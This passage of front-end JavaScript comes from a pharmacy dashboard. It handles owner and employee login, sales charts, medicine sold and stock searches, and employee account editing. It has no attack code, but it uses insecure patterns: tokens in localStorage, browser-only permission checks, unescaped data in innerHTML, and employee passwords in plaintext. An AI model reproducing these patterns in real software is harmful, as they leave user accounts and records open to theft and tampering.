    if(_r.ok){const _d=await _r.json(); sessionStorage.setItem('authToken',_d.token); localStorage.setItem('authToken',_d.token); currentUser={role:'owner',name:'Owner',permissions:['all']}; enterApp();}
    else { errEl.textContent='Incorrect password.'; }
  } else {
    const uname = document.getElementById('inp-username').value.trim().toLowerCase();
    const empRes = await fetch('/api/auth/login', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({username: uname, password: pass})
    });
    const empData = await empRes.json();
    if (empRes.ok) {
      sessionStorage.setItem('authToken', empData.token);
      localStorage.setItem('authToken', empData.token);
      currentUser = {role:'employee', name:empData.name, permissions:empData.permissions, username:uname, branch:empData.branch};
      enterApp();
    } else {
      errEl.textContent = empData.error || 'Invalid username or password.';
    }
  }
}

document.getElementById('inp-password').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });
document.getElementById('inp-username').addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); });

async function enterApp() {
  document.getElementById('login-screen').style.display = 'none';
  document.getElementById('app').style.display = 'flex';
  const rb = document.getElementById('role-badge');
  rb.textContent = currentUser.role==='owner' ? 'Owner' : `Employee — ${currentUser.name}`;
  rb.className = 'role-badge ' + currentUser.role;
  buildTabs();
  setupBottomNav();
  document.getElementById('main-content').innerHTML = '<div class="loading-bar"><div class="spinner"></div> Loading live data…</div>';
  try {
    summaryData = await fetchSummary(currentMonths);
    document.getElementById('update-time').textContent = 'Updated ' + new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
  } catch(e) { console.error('Summary fetch error:', e); }

  // Land on the first tab the user actually has permission for
  if (can('transactions') || can('branches')) {
    renderNewOverview();
  } else if (can('search')) {
    const t = document.querySelector('.tab[data-tab="search"]');
    if (t) { document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active')); t.classList.add('active'); }
    renderSearch();
  } else if (can('stock')) {
    const t = document.querySelector('.tab[data-tab="stock"]');
    if (t) { document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active')); t.classList.add('active'); }
    if (typeof renderStock === 'function') renderStock();
  } else if (can('customers')) {
    const t = document.querySelector('.tab[data-tab="customers"]');
    if (t) { document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active')); t.classList.add('active'); }
    renderCustomers();
  } else {
    renderNewOverview(); // will show the locked message
  }
  refreshTimer = setInterval(async () => {
    try {
      summaryData = await fetchSummary(currentMonths);
      document.getElementById('update-time').textContent = 'Updated ' + new Date().toLocaleTimeString([],{hour:'2-digit',minute:'2-digit',second:'2-digit'});
    } catch(e) { console.error('Refresh error:', e); }
    const activeTab = document.querySelector('.tab.active')?.dataset?.tab;
    if(activeTab==='overview') renderNewOverview();
  }, REFRESH_MS);
}

function buildTabs() {
  const isOwner = currentUser.role === 'owner';
  const canSearch = isOwner || currentUser.permissions.includes('search');
  const canStock = isOwner || currentUser.permissions.includes('stock');
  let tabs = `<div class="tab active" data-tab="overview" onclick="switchTab('overview',this)">📊 Overview</div>`;
  if(canSearch) tabs += `<div class="tab" data-tab="search" onclick="switchTab('search',this)">🔍 Medicine Sold</div>`;
  if(canStock) tabs += `<div class="tab" data-tab="stock" onclick="switchTab('stock',this)">📦 Medicine Stock</div>`;
  const canCustomers = isOwner || currentUser.permissions.includes('customers');
  if(canCustomers) tabs += `<div class="tab" data-tab="customers" onclick="switchTab('customers',this)">👥 Regular Customers</div>`;
  if(isOwner) tabs += `<div class="tab" data-tab="employees" onclick="switchTab('employees',this)">👤 Manage Employees</div>`;
  document.getElementById('tabs-bar').innerHTML = tabs;
}

function switchTab(tab, el) {
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  el.classList.add('active');
  if(tab==='overview') renderNewOverview();
  else if(tab==='search') renderSearch();
  else if(tab==='stock') renderStock();
  else if(tab==='customers') renderCustomers();
  else if(tab==='employees') renderEmployees();
}

async function signOut() {
  if (currentUser && currentUser.role === 'employee') {
    const deviceId = getDeviceId();
    await fetch('/api/logout', {
      method: 'POST',
      headers: {'Content-Type':'application/json','x-api-key': API_KEY},
      body: JSON.stringify({username: currentUser.username, deviceId})
    }).catch(()=>{});
  }
  localStorage.removeItem('authToken'); localStorage.removeItem('userRole'); localStorage.removeItem('userName'); localStorage.removeItem('userPermissions'); localStorage.removeItem('userBranch'); sessionStorage.removeItem('authToken');
  currentUser = null; loginMode = 'owner'; sheetData = []; try{localStorage.removeItem('savedSession');}catch(e){}
  if(refreshTimer) clearInterval(refreshTimer);
  if(salesChartInstance) { salesChartInstance.destroy(); salesChartInstance=null; }
  if(monthlyChartInstance) { monthlyChartInstance.destroy(); monthlyChartInstance=null; }
  document.getElementById('app').style.display = 'none';
  document.getElementById('login-screen').style.display = 'flex';
  document.getElementById('username-wrap').style.display = 'none';
  document.getElementById('login-sub').textContent = 'Owner access only';
  document.getElementById('mode-toggle').innerHTML = 'Not the owner? <span onclick="switchLoginMode()">Sign in as employee</span>';
  document.getElementById('inp-password').value = '';
  document.getElementById('inp-username').value = '';
  document.getElementById('login-error').textContent = '';
}

function can(perm) {
  if (!currentUser) return false;
  if (currentUser.role==='owner') return true;
  return currentUser.permissions.includes(perm);
}

let filteredData = [];

let summaryData = null;
let currentMonths = '1';

async function fetchSummary(months) {
  const res = await fetch('/api/summary-fast?months=' + months, { headers: { 'x-api-key': API_KEY } });
  if (!res.ok) throw new Error('Failed');
  return res.json();
}

function applyTimeFilter() {
  const val = document.getElementById('time-filter')?.value || 'all';
  if (val === 'all') {
    filteredData = sheetData;
  } else {
    const days = parseInt(val);
    const cutoff = new Date();
    cutoff.setDate(cutoff.getDate() - days);
    filteredData = sheetData.filter(r => {
      if (!r.time) return false;
      let d = typeof r.time === 'string' ? new Date(r.time) : new Date((r.time - 25569) * 86400000);
      return !isNaN(d) && d >= cutoff;
    });
  }
  renderOverviewWithData(filteredData);
}

function renderOverview() {
  filteredData = sheetData;
  renderOverviewWithData(filteredData);
}

function renderOverviewWithData(data) {
  const el = document.getElementById('main-content');
  const savedFilter = document.getElementById('time-filter')?.value || 'all';
  const branches = getBranchCounts(data);
  const topBranch = branches[0] || ['—',0];
  const peak = getPeakHour(data);
  const bestMonth = getBestMonth(data);
  const unique = getUniqueCustomers(data);
  const regular = getRegularCustomers(data);
  const oneTime = Math.max(0, unique - regular);
  const topProducts = getTopProducts(data);

  let html = '';

  if(can('transactions')) {
    html += `<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
      <div class="section-label" style="margin-bottom:0">Overview</div>
      <select id="time-filter" onchange="applyTimeFilter()" style="padding:8px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:13px;cursor:pointer;outline:none;">
        <option value="all">All Time</option>
        <option value="1">Last Day</option>
        <option value="7">Last Week</option>
        <option value="30">Last Month</option>
        <option value="90">Last 3 Months</option>
        <option value="180">Last 6 Months</option>
        <option value="365">Last Year</option>
      </select>
    </div>
    <div class="stat-grid">
      <div class="stat-card" style="--accent:var(--blue)"><div class="label">Total Transactions</div><div class="value">${data.length.toLocaleString()}</div><div class="desc">All time records</div><div class="icon">📋</div></div>
      <div class="stat-card" style="--accent:var(--teal)"><div class="label">Unique Customers</div><div class="value" style="color:var(--teal)">${unique.toLocaleString()}</div><div class="desc">Distinct profiles</div><div class="icon">👥</div></div>
      <div class="stat-card" style="--accent:var(--amber)"><div class="label">Regular Customers</div><div class="value" style="color:var(--amber)">${regular.toLocaleString()}</div><div class="desc">3 or more visits</div><div class="icon">⭐</div></div>
      <div class="stat-card" style="--accent:var(--purple)"><div class="label">One-Time Customers</div><div class="value" style="color:var(--purple)">${oneTime.toLocaleString()}</div><div class="desc">Single visit only</div><div class="icon">🆕</div></div>
    </div>
    <div class="insight-row">
      <div class="insight-card"><div class="i-label">⚡ Peak Hour</div><div class="i-value">${peak.hour}</div><div class="i-desc">${peak.count} transactions at peak</div></div>
      <div class="insight-card"><div class="i-label">📅 Best Month</div><div class="i-value">${bestMonth.label}</div><div class="i-desc">${bestMonth.count.toLocaleString()} transactions</div></div>
      <div class="insight-card"><div class="i-label">🏪 Top Branch</div><div class="i-value">${topBranch[0]}</div><div class="i-desc">${(topBranch[1]||0).toLocaleString()} transactions</div></div>
    </div>`;
  }

  if(can('transactions') || can('branches')) {
    html += `<div class="section-label" style="margin-top:14px">Sales Performance</div><div class="charts-row">`;
    if(can('transactions')) html += `<div class="chart-card"><h3>📈 Monthly Sales Trend <span class="chart-tag">${document.getElementById('time-filter')?.options[document.getElementById('time-filter')?.selectedIndex]?.text || 'All Time'}</span></h3><canvas id="monthly-chart"></canvas></div>`;
    if(can('branches')) html += `<div class="chart-card"><h3>🌿 Branch Distribution <span class="chart-tag">${branches.length} branches</span></h3><canvas id="branch-chart"></canvas></div>`;
    html += `</div>`;
  }

  if(can('transactions') || can('branches')) {
    html += `<div class="section-label" style="margin-top:14px">Rankings</div><div class="rankings-row">`;
    if(can('transactions')) {
      const maxP = topProducts[0]?.[1] || 1;
      html += `<div class="rank-card"><h3>🏷️ Top Products <span class="chart-tag">by volume</span></h3>${topProducts.map(([name,count],i) => `<div class="rank-item">${i===0?'<span class="rank-medal">🥇</span>':i===1?'<span class="rank-medal">🥈</span>':i===2?'<span class="rank-medal">🥉</span>':`<span class="rank-num">${i+1}</span>`}<span class="rank-name">${name}</span><div class="rank-bar-wrap"><div class="rank-bar" style="width:${Math.round(count/maxP*100)}%"></div></div><span class="rank-count">${count} sold</span></div>`).join('')}</div>`;
    }
    if(can('branches')) {
      const maxB = branches[0]?.[1] || 1;
      html += `<div class="rank-card"><h3>🏪 Branch Performance <span class="chart-tag">${branches.length} branches</span></h3>${branches.map(([name,count],i) => `<div class="rank-item">${i===0?'<span class="rank-medal">🥇</span>':i===1?'<span class="rank-medal">🥈</span>':i===2?'<span class="rank-medal">🥉</span>':`<span class="rank-num">${i+1}</span>`}<span class="rank-name">${name}</span><div class="rank-bar-wrap"><div class="rank-bar" style="width:${Math.round(count/maxB*100)}%"></div></div><span class="rank-count">${count.toLocaleString()} <span class="rank-pct">${Math.round(count/data.length*100)}%</span></span></div>`).join('')}</div>`;
    }
    html += `</div>`;
  }

  el.innerHTML = html;
  const tf = document.getElementById('time-filter'); if(tf) tf.value = savedFilter;

  if(can('transactions') && document.getElementById('monthly-chart')) {
    if(monthlyChartInstance) monthlyChartInstance.destroy();
    const filterVal = document.getElementById('time-filter')?.value || 'all';
    const trend = filterVal !== 'all' && parseInt(filterVal) <= 30 ? getDailyTrend(data) : getMonthlyTrend(data);
    monthlyChartInstance = new Chart(document.getElementById('monthly-chart'), {
      type: 'line',
      data: { labels: trend.labels, datasets: [{ label: 'Transactions', data: trend.values, borderColor: '#2dd4bf', backgroundColor: 'rgba(45,212,191,0.12)', borderWidth: 2.5, pointBackgroundColor: '#2dd4bf', pointRadius: filterVal !== 'all' && parseInt(filterVal) <= 30 ? 3 : 5, tension: 0.4, fill: true }] },
      options: { responsive: true, plugins: { legend: { display: false }, tooltip: { backgroundColor: '#1c2333', borderColor: '#2a3347', borderWidth: 1, titleColor: '#e6edf3', bodyColor: '#2dd4bf', padding: 12, callbacks: { label: ctx => ` ${ctx.parsed.y} transactions` } } }, scales: { x: { grid: { color: '#2a3347' }, ticks: { color: '#7d8fa8', font: {size:11}, maxTicksLimit: 10 } }, y: { grid: { color: '#2a3347' }, ticks: { color: '#7d8fa8', font: {size:11}, callback: v => v >= 1000 ? (v/1000).toFixed(v%1000===0?0:1)+'k' : v }, beginAtZero: true } } }
    });
  }

  if(can('branches') && document.getElementById('branch-chart')) {
    if(salesChartInstance) salesChartInstance.destroy();
    salesChartInstance = new Chart(document.getElementById('branch-chart'), {
      type: 'doughnut',
      data: { labels: branches.map(b=>b[0]), datasets: [{ data: branches.map(b=>b[1]), backgroundColor: BRANCH_COLORS, borderColor: '#161b27', borderWidth: 3, hoverOffset: 6 }] },
      options: { responsive: true, plugins: { legend: { position: 'right', labels: { color: '#7d8fa8', font: {size:11}, padding: 12, boxWidth: 10 } }, tooltip: { backgroundColor: '#1c2333', borderColor: '#2a3347', borderWidth: 1, padding: 12, callbacks: { label: ctx => ` ${ctx.label}: ${ctx.parsed} (${Math.round(ctx.parsed/data.length*100)}%)` } } } }
    });
  }
}

// =========================================================
// MEDICINE SOLD  (renamed from "Medicine Search")
// Adds per-branch price pulled from the Supabase stock table.
// =========================================================
function renderSearch() {
  document.getElementById('main-content').innerHTML = `
    <div class="section-label">Medicine Sold</div>
    <div class="search-section">
      <h3>🔍 Search by Medicine</h3>
      <div style="display:flex;gap:10px;margin-bottom:16px;align-items:center">
        <div class="search-wrap" style="flex:1;margin-bottom:0">
          <span class="search-icon">🔍</span>
          <input type="text" id="med-search" placeholder="Type a medicine name…" autocomplete="off" oninput="onSearchInput()" />
          <div class="suggestions" id="suggestions"></div>
        </div>
        <select id="med-time-filter" onchange="rerunSearch()" style="padding:12px 14px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius-sm);color:var(--text);font-size:13px;cursor:pointer;outline:none;white-space:nowrap">
          <option value="all">All Time</option>
          <option value="1">Last Day</option>
          <option value="7">Last Week</option>
          <option value="30" selected>Last Month</option>
          <option value="90">Last 3 Months</option>
          <option value="180">Last 6 Months</option>
          <option value="365">Last Year</option>
        </select>
      </div>
      <div class="search-results" id="search-results"></div>
    </div>`;
}

function getFilteredSheetData() {
  const val = document.getElementById('med-time-filter')?.value || 'all';
  if (val === 'all') return sheetData;
  const days = parseInt(val);
  const cutoff = new Date();
  cutoff.setDate(cutoff.getDate() - days);
  return sheetData.filter(r => {
    if (!r.time) return false;
    let d = typeof r.time === 'string' ? new Date(r.time) : new Date((r.time - 25569) * 86400000);
    return !isNaN(d) && d >= cutoff;
  });
}

function rerunSearch() {
  const name = document.getElementById('med-search')?.value;
  if (name) selectMedicine(name);
}

function onSearchInput() {
  const q = document.getElementById('med-search').value.trim();
  const suggEl = document.getElementById('suggestions');
  const resEl = document.getElementById('search-results');
  if(q.length < 2) { suggEl.classList.remove('open'); resEl.classList.remove('open'); return; }
  fetch('/api/transactions/suggestions?q=' + encodeURIComponent(q), { headers: { 'x-api-key': API_KEY } })
    .then(r => r.ok ? r.json() : [])
    .then(matches => {
      if(matches.length) {
        suggEl.innerHTML = matches.map(m => '<div class="suggestion-item" onclick="selectMedicine(\'' + m.replace(/'/g, "\\'") + '\')">'+m+'</div>').join('');
        suggEl.classList.add('open');
      } else suggEl.classList.remove('open');
    }).catch(() => suggEl.classList.remove('open'));
}

// Cache of branch -> price for the currently-selected medicine (Medicine Sold tab)
let currentSoldPrices = {};

async function fetchPricesForMedicine(name) {
  try {
    const res = await fetch('/api/stock/price?name=' + encodeURIComponent(name), { headers: { 'x-api-key': API_KEY } });
    if (!res.ok) return {};
    const rows = await res.json();
    const map = {};
    rows.forEach(r => { if (r.branch_name) map[r.branch_name] = r.price; });
    return map;
  } catch(e) { console.error('Price fetch error:', e); return {}; }
}

async function selectMedicine(name) {
  document.getElementById('med-search').value = name;
  document.getElementById('suggestions').classList.remove('open');
  const resEl = document.getElementById('search-results');
  resEl.innerHTML = '<div class="loading-bar"><div class="spinner"></div> Searching...</div>';
  resEl.classList.add('open');
  try {
    const timeVal = document.getElementById('med-time-filter')?.value || 'all';
    const url = '/api/medicine-sold?name=' + encodeURIComponent(name) + '&months=' + timeVal;
    const [soldRes, priceRes] = await Promise.all([
      fetch(url, { headers: { 'x-api-key': API_KEY } }),
      fetchPricesForMedicine(name)
    ]);
    currentSoldPrices = priceRes;
    if (!soldRes.ok) throw new Error('Failed');
    const sorted = await soldRes.json();
    const total = sorted.reduce((s,r) => s + r.count, 0);
    if(total === 0) { resEl.innerHTML = '<div class="no-results">No results for <strong>' + name + '</strong></div>'; return; }
    resEl.innerHTML = '<div class="search-result-header">Showing results for <strong>' + name + '</strong></div><div class="branch-results">' + sorted.map(({branch,count}) => {
      const price = currentSoldPrices[branch];
      const priceHtml = price != null ? '<div class="br-price">' + Number(price).toFixed(2) + ' EGP / unit</div>' : '';
      return '<div class="branch-result-card"><div class="br-name">' + branch + '</div><div class="br-count">' + count + '</div><div class="br-label">sold' + (sorted.length>1 ? ' · ' + Math.round(count/total*100) + '% of total' : '') + '</div>' + priceHtml + '</div>';
    }).join('') + '</div><div class="search-total">Total sold across all branches: <strong>' + total + '</strong> units</div>';
  } catch(e) {
    resEl.innerHTML = '<div class="no-results">Error loading results.</div>';
  }
}

document.addEventListener('click', e => { if(!e.target.closest('.search-wrap')) document.getElementById('suggestions')?.classList.remove('open'); });

// =========================================================
// MEDICINE STOCK  (new tab — queries Supabase pharmacy_stock)
// Search by product name OR product code, same UI pattern.
// =========================================================
function renderStock() {
  document.getElementById('main-content').innerHTML = `
    <div class="section-label">Medicine Stock</div>
    <div class="search-section">
      <h3>📦 Search Current Stock</h3>
      <div class="search-wrap">
        <span class="search-icon">📦</span>
        <input type="text" id="stock-search" placeholder="Type a medicine name or product code…" autocomplete="off" oninput="onStockSearchInput()" />
        <div class="suggestions" id="stock-suggestions"></div>
      </div>
      <div class="search-results" id="stock-results"></div>
    </div>`;
}

let stockSearchDebounce = null;

function onStockSearchInput() {
  const q = document.getElementById('stock-search').value.trim();
  clearTimeout(stockSearchDebounce);
  if (q.length < 2) {
    document.getElementById('stock-suggestions').classList.remove('open');
    document.getElementById('stock-results').classList.remove('open');
    return;
  }
  stockSearchDebounce = setTimeout(() => loadStockSuggestions(q), 250);
}

async function loadStockSuggestions(q) {
  const suggEl = document.getElementById('stock-suggestions');
  try {
    const res = await fetch('/api/transactions/suggestions?q=' + encodeURIComponent(q), { headers: { 'x-api-key': API_KEY } });
    const matches = res.ok ? await res.json() : [];
    if (matches.length) {
      suggEl.innerHTML = matches.map(m => `<div class="suggestion-item" onclick="selectStockItem('${m.replace(/'/g,"\\'")}')">${m}</div>`).join('');
      suggEl.classList.add('open');
    } else suggEl.classList.remove('open');
  } catch(e) { console.error('Stock suggestions error:', e); }
}

function selectStockItem(name) {
  document.getElementById('stock-search').value = name;
  document.getElementById('stock-suggestions').classList.remove('open');
  runStockSearch(name);
}

document.addEventListener('click', e => { if(!e.target.closest('#stock-search') && !e.target.closest('#stock-suggestions')) document.getElementById('stock-suggestions')?.classList.remove('open'); });

async function runStockSearch(q) {
  const resEl = document.getElementById('stock-results');
  resEl.innerHTML = `<div class="loading-bar"><div class="spinner"></div> Searching stock…</div>`;
  resEl.classList.add('open');
  try {
    const res = await fetch('/api/stock/search?q=' + encodeURIComponent(q), { headers: { 'x-api-key': API_KEY } });
    if (!res.ok) { resEl.innerHTML = `<div class="no-results">Could not load stock data. Please try again.</div>`; return; }
    const rows = await res.json();
    if (!rows.length) { resEl.innerHTML = `<div class="no-results">No stock found for "<strong>${q}</strong>"</div>`; return; }

    // Group by product name in case the search matched multiple products
    const byProduct = {};
    rows.forEach(r => {
      const key = r.product_name || '—';
      if (!byProduct[key]) byProduct[key] = [];
      byProduct[key].push(r);
    });

    const productNames = Object.keys(byProduct);
    const totalStock = rows.reduce((sum,r) => sum + (Number(r.stock) || 0), 0);

    let html = '';
    productNames.forEach(name => {
      const items = byProduct[name].sort((a,b) => (b.stock||0) - (a.stock||0));
      html += `<div class="search-result-header" style="margin-top:${html?'20px':'0'}">Stock for <strong>${name}</strong></div>
      <div class="branch-results">${items.map(item => {
        const lowStock = (Number(item.stock)||0) <= 5;
        return `<div class="branch-result-card ${lowStock?'low-stock':''}">
          <div class="br-name">${item.branch_name||'—'}</div>
          <div class="br-stock">${item.stock ?? 0}</div>
          <div class="br-label">in stock${lowStock?' · low':''}</div>
          ${item.price != null ? `<div class="br-price">${Number(item.price).toFixed(2)} EGP</div>` : ''}
        </div>`;
      }).join('')}</div>`;
    });

    html += `<div class="search-total">Total units in stock across all branches: <strong>${totalStock.toLocaleString()}</strong></div>`;
    resEl.innerHTML = html;
  } catch(e) {
    console.error('Stock search error:', e);
    resEl.innerHTML = `<div class="no-results">Something went wrong while searching stock.</div>`;
  }
}

// EMPLOYEE MANAGEMENT
// =========================================================
async function renderEmployees() {
  await loadEmployees();
  const el = document.getElementById('main-content');
  const permLabels = { transactions:'📋 Transactions', customers:'👤 Customers', branches:'🏪 Branches', search:'🔍 Medicine Sold', stock:'📦 Stock' };
  const rows = employees.map((e,i) => `
    <tr>
      <td>${e.name}</td>
      <td style="color:var(--muted);font-size:12px">${e.username}</td>
      <td>${e.branch||'All'}</td>
      <td>${e.permissions.map(p=>`<span class="perm-tag">${permLabels[p]||p}</span>`).join('')}</td>
      <td><span class="status-dot status-active"></span>Active</td>
      <td><button class="btn-edit" onclick="openEditModal(${i})">Edit</button><button class="btn-delete" onclick="deleteEmployee(${i})">Remove</button></td>
    </tr>`).join('');
  el.innerHTML = `
    <div class="emp-header">
      <div class="section-label" style="margin-bottom:0">Employee Accounts (${employees.length})</div>
      <button class="btn-add" onclick="openNewModal()">+ New Employee</button>
    </div>
    <table class="emp-table">
      <thead><tr><th>Name</th><th>Username</th><th>Branch</th><th>Permissions</th><th>Status</th><th>Actions</th></tr></thead>
      <tbody>${rows||'<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:32px">No employees yet.</td></tr>'}</tbody>
    </table>`;
}

function openNewModal() {
  editingIndex = null;
  document.getElementById('modal-title').textContent = 'New Employee Account';
  document.getElementById('emp-name').value=''; document.getElementById('emp-uname').value='';
  document.getElementById('emp-pass').value=''; document.getElementById('emp-branch').value='';
  document.querySelectorAll('#emp-modal input[type=checkbox]').forEach(c=>c.checked=false);
  document.getElementById('emp-modal').classList.add('open');
}

function openEditModal(i) {
  editingIndex = i; const e = employees[i];
  document.getElementById('modal-title').textContent = 'Edit Employee';
  document.getElementById('emp-name').value=e.name; document.getElementById('emp-uname').value=e.username;
  document.getElementById('emp-pass').value=e.password; document.getElementById('emp-branch').value=e.branch||'';
  document.querySelectorAll('#emp-modal input[type=checkbox]').forEach(c=>c.checked=e.permissions.includes(c.value));
  document.getElementById('emp-modal').classList.add('open');
}

function closeModal() { document.getElementById('emp-modal').classList.remove('open'); }

async function saveEmployee() {
  const name=document.getElementById('emp-name').value.trim();
  const uname=document.getElementById('emp-uname').value.trim();
  const pass=document.getElementById('emp-pass').value.trim();
  const branch=document.getElementById('emp-branch').value;
  const perms=[...document.querySelectorAll('#emp-modal input[type=checkbox]:checked')].map(c=>c.value);
  if(!name||!uname||!pass){alert('Fill in name, username and password.');return;}
  const dup=employees.find((e,i)=>e.username.toLowerCase()===uname.toLowerCase()&&i!==editingIndex);
  if(dup){alert('Username already taken.');return;}
  const entry={name,username:uname,password:pass,branch,permissions:perms,active:true};
  if(editingIndex!==null) employees[editingIndex]={...employees[editingIndex],...entry};
  else employees.push(entry);
  await persistEmployees();
  closeModal(); renderEmployees();
}

async function deleteEmployee(i) {
  if(!confirm(`Remove ${employees[i].name}?`))return;
  employees.splice(i,1);
  await persistEmployees();
  renderEmployees();
}

document.getElementById('emp-modal').addEventListener('click',function(e){if(e.target===this)closeModal();});

function switchTabMobile(tab, el) {
  document.querySelectorAll('.bnav-item').forEach(b => b.classList.remove('active'));
  el.classList.add('active');
  if(tab==='overview') renderOverview();
  else if(tab==='search') renderSearch();
  else if(tab==='customers') renderCustomers();
  else if(tab==='employees') renderEmployees();
}

function setupBottomNav() {
  const isOwner = currentUser && currentUser.role === 'owner';
  const canSearch = isOwner || (currentUser && currentUser.permissions.includes('search'));
  const canCustomers = isOwner || (currentUser && currentUser.permissions.includes('customers'));
  document.getElementById('bnav-search').style.display = canSearch ? 'flex' : 'none';
  document.getElementById('bnav-customers').style.display = canCustomers ? 'flex' : 'none';
  document.getElementById('bnav-employees').style.display = isOwner ? 'flex' : 'none';
}
